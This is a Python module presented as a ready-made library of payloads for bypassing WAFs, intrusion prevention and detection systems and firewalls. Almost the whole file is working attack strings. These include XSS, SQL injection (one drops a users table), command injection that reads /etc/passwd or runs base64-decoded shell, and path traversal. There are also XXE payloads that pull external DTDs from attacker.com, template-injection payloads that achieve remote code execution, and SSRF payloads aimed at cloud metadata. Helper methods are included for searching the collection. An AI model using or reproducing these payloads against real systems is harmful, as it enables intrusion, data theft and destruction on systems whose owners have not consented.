"""
Ready-Made Payload Library for Bypassing WAFs, IPS, IDS, and Firewalls
Contains pre-built payloads for various attack vectors and bypass techniques.
"""

from typing import Dict, List, Optional


class PayloadCategory:
    """Payload categories for organization"""
    XSS = 'xss'
    SQLI = 'sqli'
    COMMAND_INJECTION = 'command_injection'
    PATH_TRAVERSAL = 'path_traversal'
    XXE = 'xxe'
    SSTI = 'ssti'
    SSRF = 'ssrf'
    LDAP = 'ldap'
    NOSQL = 'nosql'
    GENERAL = 'general'


class BypassTarget:
    """Target security control types"""
    WAF = 'waf'
    IPS = 'ips'
    IDS = 'ids'
    FIREWALL = 'firewall'
    FILTER = 'filter'
    ALL = 'all'


class ReadyMadePayloads:
    """Collection of ready-made bypass payloads"""
    
    # XSS Bypass Payloads
    XSS_PAYLOADS = {
        'xss_basic_script': {
            'payload': '<script>alert(1)</script>',
            'description': 'Basic XSS payload',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_img_onerror': {
            'payload': '<img src=x onerror=alert(1)>',
            'description': 'Image tag with onerror event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_svg_onload': {
            'payload': '<svg onload=alert(1)>',
            'description': 'SVG tag with onload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_javascript_protocol': {
            'payload': '<a href="javascript:alert(1)">click</a>',
            'description': 'JavaScript protocol in anchor tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_iframe_srcdoc': {
            'payload': '<iframe srcdoc="<script>alert(1)</script>">',
            'description': 'Iframe with srcdoc attribute',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_body_onload': {
            'payload': '<body onload=alert(1)>',
            'description': 'Body tag with onload event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_input_onfocus': {
            'payload': '<input onfocus=alert(1) autofocus>',
            'description': 'Input with autofocus and onfocus',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_details_ontoggle': {
            'payload': '<details open ontoggle=alert(1)>',
            'description': 'Details tag with ontoggle event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_marquee_onstart': {
            'payload': '<marquee onstart=alert(1)>',
            'description': 'Marquee tag with onstart event',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_style_expression': {
            'payload': '<div style="xss:expression(alert(1))">',
            'description': 'CSS expression (IE only)',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_meta_refresh': {
            'payload': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            'description': 'Meta refresh with JavaScript URL',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_link_import': {
            'payload': '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
            'description': 'HTML import with data URI',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_object_data': {
            'payload': '<object data="javascript:alert(1)">',
            'description': 'Object tag with JavaScript data',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_embed_src': {
            'payload': '<embed src="javascript:alert(1)">',
            'description': 'Embed tag with JavaScript source',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_form_action': {
            'payload': '<form action="javascript:alert(1)"><input type="submit">',
            'description': 'Form with JavaScript action',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'xss_mixed_case': {
            'payload': '<ScRiPt>alert(1)</sCrIpT>',
            'description': 'Mixed case script tag',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_backticks': {
            'payload': '<script>alert`1`</script>',
            'description': 'Using backticks instead of parentheses',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_event_handler_spaces': {
            'payload': '<img src=x onerror = alert(1)>',
            'description': 'Event handler with spaces',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_double_encoded': {
            'payload': '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            'description': 'Double URL encoded script',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'xss_unicode': {
            'payload': '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
            'description': 'Unicode encoded JavaScript',
            'category': PayloadCategory.XSS,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        }
    }
    
    # SQL Injection Bypass Payloads
    SQLI_PAYLOADS = {
        'sqli_union_select': {
            'payload': "' UNION SELECT NULL,NULL,NULL--",
            'description': 'Basic UNION SELECT injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_comment_inline': {
            'payload': "' OR /**/ '1'='1",
            'description': 'Inline comment bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_double_dash': {
            'payload': "' OR 1=1--",
            'description': 'Double dash comment',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_hex_encoded': {
            'payload': "' OR 0x313d31--",
            'description': 'Hex encoded condition',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_char_function': {
            'payload': "' OR CHAR(49)=CHAR(49)--",
            'description': 'Using CHAR function',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_concat': {
            'payload': "' OR 'a'||'b'='ab'--",
            'description': 'String concatenation',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_scientific_notation': {
            'payload': "' OR 1e0=1--",
            'description': 'Scientific notation bypass',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_nested_comments': {
            'payload': "' OR /**/1/**/=/**/1--",
            'description': 'Multiple inline comments',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_mixed_case': {
            'payload': "' Or 1=1--",
            'description': 'Mixed case keywords',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_whitespace_variation': {
            'payload': "'\tOR\n1=1--",
            'description': 'Tab and newline as whitespace',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_url_encoded': {
            'payload': "%27%20OR%201=1--",
            'description': 'URL encoded injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_double_url_encoded': {
            'payload': "%2527%2520OR%25201%253D1--",
            'description': 'Double URL encoded',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_buffer_overflow': {
            'payload': "' OR 1=1 LIMIT 1 OFFSET " + "1" * 1000 + "--",
            'description': 'Buffer overflow attempt',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'sqli_null_byte': {
            'payload': "' OR 1=1%00--",
            'description': 'Null byte injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_time_based': {
            'payload': "' AND SLEEP(5)--",
            'description': 'Time-based blind SQLi',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'sqli_stacked_queries': {
            'payload': "'; DROP TABLE users--",
            'description': 'Stacked query injection',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_substring': {
            'payload': "' OR SUBSTRING(version(),1,1)='5'--",
            'description': 'Substring function',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_in_operator': {
            'payload': "' OR 1 IN (1,2,3)--",
            'description': 'IN operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_between': {
            'payload': "' OR 1 BETWEEN 0 AND 2--",
            'description': 'BETWEEN operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'sqli_like': {
            'payload': "' OR 'a' LIKE 'a'--",
            'description': 'LIKE operator',
            'category': PayloadCategory.SQLI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }
    
    # Command Injection Bypass Payloads
    COMMAND_INJECTION_PAYLOADS = {
        'cmd_semicolon': {
            'payload': '; ls -la',
            'description': 'Semicolon command separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_pipe': {
            'payload': '| whoami',
            'description': 'Pipe operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_ampersand': {
            'payload': '& ipconfig',
            'description': 'Ampersand separator (Windows)',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_backticks': {
            'payload': '`whoami`',
            'description': 'Backtick command substitution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_dollar_paren': {
            'payload': '$(whoami)',
            'description': 'Dollar parenthesis substitution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_newline': {
            'payload': '\nwhoami',
            'description': 'Newline separator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_double_pipe': {
            'payload': '|| cat /etc/passwd',
            'description': 'OR operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_double_ampersand': {
            'payload': '&& ls -la',
            'description': 'AND operator',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_encoded_semicolon': {
            'payload': '%3b+ls+-la',
            'description': 'URL encoded semicolon',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_wildcard_chars': {
            'payload': '/b??/c?t /etc/passwd',
            'description': 'Wildcard character obfuscation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_slash_separation': {
            'payload': '/usr/b\in/wh\oami',
            'description': 'Backslash separation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_hex_encoding': {
            'payload': '\\x77\\x68\\x6f\\x61\\x6d\\x69',
            'description': 'Hex encoded command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_base64': {
            'payload': 'echo d2hvYW1p | base64 -d | sh',
            'description': 'Base64 encoded command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_variable_expansion': {
            'payload': '$HOME/../../../etc/passwd',
            'description': 'Variable expansion',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_comment': {
            'payload': '| whoami #',
            'description': 'Comment to ignore rest',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }
    
    # Path Traversal Bypass Payloads
    PATH_TRAVERSAL_PAYLOADS = {
        'path_basic': {
            'payload': '../../../etc/passwd',
            'description': 'Basic path traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_url_encoded': {
            'payload': '..%2F..%2F..%2Fetc%2Fpasswd',
            'description': 'URL encoded traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_double_encoded': {
            'payload': '..%252F..%252F..%252Fetc%252Fpasswd',
            'description': 'Double URL encoded',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_unicode': {
            'payload': '..\\u002f..\\u002f..\\u002fetc\\u002fpasswd',
            'description': 'Unicode encoded',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_backslash': {
            'payload': '..\\..\\..\\windows\\win.ini',
            'description': 'Backslash (Windows)',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_null_byte': {
            'payload': '../../../etc/passwd%00.jpg',
            'description': 'Null byte bypass',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_dot_slash': {
            'payload': '....//....//....//etc/passwd',
            'description': 'Extra dots and slashes',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_absolute': {
            'payload': '/etc/passwd',
            'description': 'Absolute path',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_windows_absolute': {
            'payload': 'C:\\windows\\win.ini',
            'description': 'Windows absolute path',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_overlong_utf8': {
            'payload': '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            'description': 'Overlong UTF-8 encoding',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        }
    }
    
    # XXE Bypass Payloads
    XXE_PAYLOADS = {
        'xxe_basic': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'Basic XXE payload',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_parameter_entity': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>',
            'description': 'Parameter entity XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_blind': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo></foo>',
            'description': 'Blind XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'xxe_utf16': {
            'payload': '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'description': 'UTF-16 encoded XXE',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_expect': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            'description': 'XXE with expect wrapper',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_ssrf': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>',
            'description': 'XXE for SSRF',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'xxe_dos': {
            'payload': '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
            'description': 'Billion laughs DoS',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'xxe_doctype_variation': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo></foo>',
            'description': 'DOCTYPE variation',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_cdata': {
            'payload': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
            'description': 'XXE with CDATA',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'xxe_svg': {
            'payload': '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text x="0" y="50">&xxe;</text></svg>',
            'description': 'XXE in SVG file',
            'category': PayloadCategory.XXE,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }
    
    # SSTI Bypass Payloads
    SSTI_PAYLOADS = {
        'ssti_jinja2': {
            'payload': '{{7*7}}',
            'description': 'Basic Jinja2 SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_jinja2_rce': {
            'payload': "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            'description': 'Jinja2 RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_erb': {
            'payload': '<%= 7*7 %>',
            'description': 'Basic ERB SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_freemarker': {
            'payload': '${7*7}',
            'description': 'FreeMarker SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_velocity': {
            'payload': '#set($x=7*7)$x',
            'description': 'Velocity SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_smarty': {
            'payload': '{$smarty.version}',
            'description': 'Smarty version disclosure',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ssti_twig': {
            'payload': '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',
            'description': 'Twig RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_mako': {
            'payload': '${7*7}',
            'description': 'Mako SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ssti_underscore': {
            'payload': '<%= global.process.mainModule.require("child_process").execSync("whoami") %>',
            'description': 'Underscore.js template RCE',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ssti_pug': {
            'payload': '#{7*7}',
            'description': 'Pug/Jade SSTI test',
            'category': PayloadCategory.SSTI,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        }
    }
    
    # SSRF Bypass Payloads
    SSRF_PAYLOADS = {
        'ssrf_localhost': {
            'payload': 'http://localhost/admin',
            'description': 'Basic localhost SSRF',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_127001': {
            'payload': 'http://127.0.0.1/admin',
            'description': '127.0.0.1 SSRF',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_hex_encoding': {
            'payload': 'http://0x7f.0x00.0x00.0x01/admin',
            'description': 'Hex encoded IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_octal': {
            'payload': 'http://0177.0.0.01/admin',
            'description': 'Octal encoded IP',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_decimal': {
            'payload': 'http://2130706433/admin',
            'description': 'Decimal IP (127.0.0.1)',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_short_ip': {
            'payload': 'http://127.1/admin',
            'description': 'Shortened IP notation',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_cloud_metadata': {
            'payload': 'http://169.254.169.254/latest/meta-data/',
            'description': 'Cloud metadata endpoint',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'ssrf_redirect': {
            'payload': 'http://attacker.com/redirect-to-internal',
            'description': 'SSRF via redirect',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_dns_rebinding': {
            'payload': 'http://rebind.attacker.com/admin',
            'description': 'DNS rebinding',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'ssrf_url_bypass': {
            'payload': 'http://evil.com@127.0.0.1/admin',
            'description': 'URL parser bypass',
            'category': PayloadCategory.SSRF,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        }
    }
    
    @classmethod
    def get_all_payloads(cls) -> Dict[str, Dict]:
        """Get all payloads combined"""
        all_payloads = {}
        all_payloads.update(cls.XSS_PAYLOADS)
        all_payloads.update(cls.SQLI_PAYLOADS)
        all_payloads.update(cls.COMMAND_INJECTION_PAYLOADS)
        all_payloads.update(cls.PATH_TRAVERSAL_PAYLOADS)
        all_payloads.update(cls.XXE_PAYLOADS)
        all_payloads.update(cls.SSTI_PAYLOADS)
        all_payloads.update(cls.SSRF_PAYLOADS)
        return all_payloads
    
    @classmethod
    def get_by_category(cls, category: str) -> Dict[str, Dict]:
        """Get payloads by category"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['category'] == category
        }
    
    @classmethod
    def get_by_bypass_target(cls, target: str) -> Dict[str, Dict]:
        """Get payloads by bypass target"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['bypass_target'] == target or payload['bypass_target'] == BypassTarget.ALL
        }
    
    @classmethod
    def get_by_risk_level(cls, risk_level: str) -> Dict[str, Dict]:
        """Get payloads by risk level"""
        all_payloads = cls.get_all_payloads()
        return {
            name: payload for name, payload in all_payloads.items()
            if payload['risk_level'] == risk_level
        }
    
    @classmethod
    def get_payload(cls, payload_name: str) -> Optional[Dict]:
        """Get a specific payload by name"""
        all_payloads = cls.get_all_payloads()
        return all_payloads.get(payload_name)
    
    @classmethod
    def search_payloads(cls, search_term: str) -> Dict[str, Dict]:
        """Search payloads by name or description"""
        all_payloads = cls.get_all_payloads()
        search_term_lower = search_term.lower()
        return {
            name: payload for name, payload in all_payloads.items()
            if search_term_lower in name.lower() or search_term_lower in payload['description'].lower()
        }
